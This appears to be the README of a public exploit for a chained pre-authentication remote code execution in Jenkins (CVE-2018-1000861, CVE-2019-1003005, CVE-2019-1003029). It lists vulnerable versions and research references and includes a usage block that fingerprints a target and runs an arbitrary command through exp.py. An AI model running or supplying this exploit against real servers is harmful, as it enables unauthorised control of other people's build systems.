# awesome-jenkins-rce-2019

There is no pre-auth RCE in Jenkins since May 2017, but this is the one!

It chains CVE-2018-1000861, CVE-2019-1003005 and CVE-2019-1003029 to a more reliable and elegant pre-auth remote code execution!


# Affect list

* ANONYMOUS_READ disable
    - Jenkins version < 2.138

* ANONYMOUS_READ enable(or with a normal user account)
    - Jenkins build time < 2019-01-28



# Usage

```bash
$ curl -s -I http://jenkins/| grep X-Jenkins
X-Jenkins: 2.137
X-Jenkins-Session: 20f72c2e
X-Jenkins-CLI-Port: 50000
X-Jenkins-CLI2-Port: 50000

$ python exp.py http://jenkins/ 'curl orange.tw'
[*] ANONYMOUS_READ disable!
[*] Bypass with CVE-2018-1000861!
[*] Exploit success!(it should be :P)
```


# Tested on

* Jenkins 2.53
* Jenkins 2.122
* Jenkins 2.137
* Jenkins 2.138 with ANONYMOUS_READ enable
* Jenkins 2.152 with ANONYMOUS_READ enable
* Jenkins 2.153 with ANONYMOUS_READ enable
* Script Security Plugin 1.43
* Script Security Plugin 1.48


# Acknowledgements

* [@orange_8361](https://twitter.com/orange_8361) for CVE-2018-1000861
* [@0ang3el](https://twitter.com/0ang3el) for CVE-2019-1003005
* [@webpentest](https://twitter.com/webpentest) for CVE-2019-1003029


Part slides from my HITB AMS 2019 talk:

![1.png](img/1.png)
![2.png](img/2.png)
![3.png](img/3.png)



# References

* [Hacking Jenkins Part 1 - Play with Dynamic Routing](https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html)
* [Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!](https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html)
* [Jenkins Security Advisory 2018-12-05](https://jenkins.io/security/advisory/2019-12-05/)
* [Jenkins Security Advisory 2019-01-28](https://jenkins.io/security/advisory/2019-01-28/)
* [Jenkins Security Advisory 2019-03-06](https://jenkins.io/security/advisory/2019-03-06/)
